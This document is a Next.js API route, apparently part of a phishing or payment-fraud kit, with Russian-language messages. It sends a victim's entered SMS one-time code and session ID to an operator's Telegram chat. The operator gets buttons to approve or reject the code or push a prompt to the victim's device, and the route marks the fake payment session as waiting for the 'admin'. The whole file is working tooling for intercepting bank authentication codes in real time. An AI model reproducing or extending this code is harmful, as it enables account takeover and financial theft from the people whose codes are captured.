import { NextRequest, NextResponse } from 'next/server';
import { APP_CONFIG } from '../../../env.config';

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

export async function POST(request: NextRequest) {
  try {
    const { otp, sessionId } = await request.json();

    const message = `
📱 *ПОЛЬЗОВАТЕЛЬ ВВЕЛ SMS КОД*

🔢 *Введенный код:* \`${otp}\`
🔑 *ID сессии:* \`${sessionId}\`

Подтвердить этот код?
(Можно также отправить PUSH на устройство пользователя — кнопка ниже)
`;

    // inline keyboard: row 1 = reject / approve, row 2 = push request
    const keyboard = {
      inline_keyboard: [
        [
          {
            text: "❌ Неверный код",
            callback_data: `reject_otp_${sessionId}`
          },
          {
            text: "✅ Правильный код",
            callback_data: `approve_otp_${sessionId}`
          }
        ],
        [
          {
            text: "🔔 Отправить Push",
            callback_data: `push_${sessionId}`
          }
        ]
      ]
    };

    const telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown',
        reply_markup: keyboard
      }),
    });

    if (telegramResponse.ok) {
      // Обновляем статус на 'otp_submitted' чтобы показать что код отправлен и ждем ответа админа
      await fetch(`${APP_CONFIG.APP_URL}/api/payment-status-vercel`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          sessionId: sessionId,
          status: 'otp_submitted'
        })
      });

      return NextResponse.json({ success: true });
    } else {
      const error = await telegramResponse.text();
      console.error('Telegram API error:', error);
      return NextResponse.json({ error: 'Failed to send to Telegram' }, { status: 500 });
    }
  } catch (error) {
    console.error('API error:', error);
    return NextResponse.json({ error: 'Internal server error' }, { status: 500 });
  }
}
